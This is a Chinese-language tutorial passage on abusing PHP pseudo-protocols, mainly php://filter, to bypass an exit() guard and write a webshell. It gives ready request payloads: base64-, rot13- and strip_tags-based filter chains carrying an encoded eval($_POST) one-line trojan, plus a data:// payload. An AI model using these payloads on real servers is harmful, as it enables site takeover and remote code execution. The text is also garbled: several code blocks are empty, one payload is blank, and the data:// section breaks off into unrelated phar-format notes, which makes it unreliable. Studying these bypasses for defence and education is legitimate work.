# 伪协议
---
**相关文章 & Source & Reference**
- [PHP伪协议的妙用](https://mp.weixin.qq.com/s/SqGH_AoYForFvh5W52fXkQ)
---
## filter协议
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
```
resource=     这个参数是必须的。它指定了你要筛选过滤的数据流。
read=         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
```
文件包含的案例
```php
```
在同目录下有一个flag.php文件
```php
".$content);
```
这几行代码允许我们写入文件，但是当我们写入文件的时候会在我们写的字符串前添加 exit 的命令。这样导致我们即使写入了一句话木马，依然是执行不了一句话的。
分析这几行代码，一共需要我们传两个参数，一个是 POST 请求的 content，另一个是 GET 请求的 filename，而对于 GET 请求中的 filename 变量，我们是可以通过 php://filter 伪协议来控制的，在前面有提到，最常见的方法是使用 base64 的方法将 content 解码后传入。
### base64编码绕过
假设我们先随便传入一句话木马：
```
?filename=php://filter/convert.base64-decode/resource=1.php
POSTDATA: content=PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+
```
这个时候我们打开1.php文件：
![](../../../../../assets/img/Security/RedTeam/语言安全/PHP安全/伪协议/1.png)
可以发现里面是一堆乱码，原因是不仅我们的加密后的一句话木马进行了 base64 解码，而且前面的 exit 也进行了解码。
仔细分析一下 exit 的代码：
```php
```
base64 编码中只包含 64 个可打印字符，而当 PHP 在解码 base64 时，遇到不在其中的字符时，会选择跳过这些字符，将有效的字符重新组成字符串进行解码。
例如：
```php
```
得到结果：test
如果我们在 str 变量中添加一些不可见的字符或者是不可解码字符（\x00，?）
```php
```
得到的结果仍然为：test
因此，对于 exit 中的代码，字符 、空格等字符不符合 base64 解码范围。最终解码符合要求的只有 phpexit 这 7 个字符，而 base64 在解码的时候，是 4 个字节一组，因此还少一个，所以我们将这一个手动添加上去。
传payload如下：
```
?filename=php://filter/convert.base64-decode/resource=1.php
POSTDATA: content=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+
```
content中第一个字符a就是我们添加的
这个时候我们查看1.php的内容如下：
![](../../../../../assets/img/Security/RedTeam/语言安全/PHP安全/伪协议/2.png)
可以看到一句话木马已经成功写入了。
### rot13编码绕过
除了使用 base64 编码绕过，我们还可以使用 rot13 编码绕过。相比 base64 编码，rot13 的绕过 exit 更加方便，因为不用考虑前面添加的内容是否可以用 base64 解码，也不需要计算可 base64 解码的字符数量。
传payload：
```
?filename=php://filter/string.rot13/resource=2.php
POSTDATA: content=
```
打开1.php文件：
![](../../../../../assets/img/Security/RedTeam/语言安全/PHP安全/伪协议/3.png)
### 多种过滤器绕过
再仔细观察 exit 的代码：
```php
```
可以看到 exit 的代码其实本质上是 XML 标签，因此我们可以使用 strip_tags 函数除去该 XML 标签
并且，filter 协议允许我们使用多种过滤器，所以我们还是针对上面的实例代码：
```
?filename=php://filter/string.strip_tags|convert.base64-decode/resource=3.php
POSTDATA: content=PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+
```
![](../../../../../assets/img/Security/RedTeam/语言安全/PHP安全/伪协议/4.png)
---
## php://data
```php
// ?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```
其中 base64 部分就是 
    ```
2. manifest describing the contents
    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分，也存储用户自定义的meta-data，这是用来攻击的入口，最核心的地方
3. the file contents
    被压缩文件的内容
4. signature for verifying Phar integrity
    可选项，即签名。